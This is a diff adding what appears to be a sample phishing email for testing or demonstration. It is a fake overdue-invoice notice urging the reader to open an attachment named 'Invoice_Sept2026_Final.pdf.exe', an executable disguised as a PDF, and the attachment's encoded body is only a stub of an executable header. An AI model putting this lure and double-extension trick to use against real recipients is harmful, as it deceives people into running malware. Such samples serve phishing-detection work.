@@ -1,0 +1,23 @@
+From: "Accounts Payable Dispatch" <billing-department@global-invoicing-portal.com>
+Reply-To: billing-department@global-invoicing-portal.com
+To: accounts@target-corp.com
+Subject: Overdue Notice: Outstanding Remittance Advice INV-2026-9081
+Date: Tue, 27 Oct 2026 16:45:00 +0530
+Message-ID: <INV-9081-ATTACH@global-invoicing-portal.com>
+Content-Type: multipart/mixed; boundary="====BOUNDARY_ATTACH_DEMO===="
+MIME-Version: 1.0
+
+--====BOUNDARY_ATTACH_DEMO====
+Content-Type: text/plain; charset=UTF-8
+
+Please find attached your overdue remittance summary for September 2026.
+Please open the attached PDF report immediately to reconcile penalty fees.
+
+--====BOUNDARY_ATTACH_DEMO====
+Content-Type: application/octet-stream; name="Invoice_Sept2026_Final.pdf.exe"
+Content-Disposition: attachment; filename="Invoice_Sept2026_Final.pdf.exe"
+Content-Transfer-Encoding: base64
+
+TVpQAAIAAAAEAA8A//8AALgAAAAAAAAAQAAaAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+--====BOUNDARY_ATTACH_DEMO====--
+
